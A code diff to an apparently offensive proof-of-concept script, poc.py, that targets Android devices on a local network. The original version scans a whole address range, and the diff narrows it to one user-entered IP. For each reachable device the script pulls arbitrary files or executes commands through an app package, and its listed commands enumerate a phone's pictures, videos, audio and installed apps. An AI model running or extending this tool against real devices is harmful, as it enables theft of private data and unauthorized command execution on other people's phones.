@@ -7,6 +7,7 @@ from socket import *
 
 verbose = True
 
+#addr="192.168.87.143"
 
 def sanitize_json(json):
     json = json.replace("\'", "\"")
@@ -93,7 +94,7 @@ def show_available_cmds():
     print('listPics: List all the pictures')
     print('listVideos: List all the videos')
     print('listAudios: List all the audio files')
-    print('listApps: List all the apps installed')
+    print('po: List all the apps installed')
     print('listAppsSystem: List all the system apps')
     print('listAppsPhone: List all the phone apps')
     print('listAppsSdcard: List all the apk files in the sdcard')
@@ -128,25 +129,25 @@ def set_up_menu():
 
 
 def main():
+    addr=str(input("Enter IP Address\n"))
     options, _ = set_up_menu()
     verbose = options.verb
 
     if len(sys.argv) > 1 and sys.argv[1] == 'list':
         show_available_cmds()
     elif options.filepath != '' or options.cmd != '':
-        for ip in range(0, 255):
-            addr = options.network + str(ip)
-            if verbose:
-                print('[*] Checking address: ' + addr)
+        # for ip in range(0, 255):
+        #     addr = options.network + str(ip)
+        #     if verbose:
+        #         print('[*] Checking address: ' + addr)
 
-            if is_up(addr):
-                if verbose:
-                    print('[+] Address is up: ' + addr)
-
-                if options.filepath != '':
-                    get_file(addr, options.filepath)
-                elif options.cmd != '':
-                    execute_cmd(addr, options.cmd, options.package)
+        #     if is_up(addr):
+        #         if verbose:
+        #             print('[+] Address is up: ' + addr)
+        if options.filepath != '':
+            get_file(addr, options.filepath)
+        elif options.cmd != '':
+            execute_cmd(addr, options.cmd, options.package)
     else:
         print('Usage:')
         print('- python3 poc.py list')
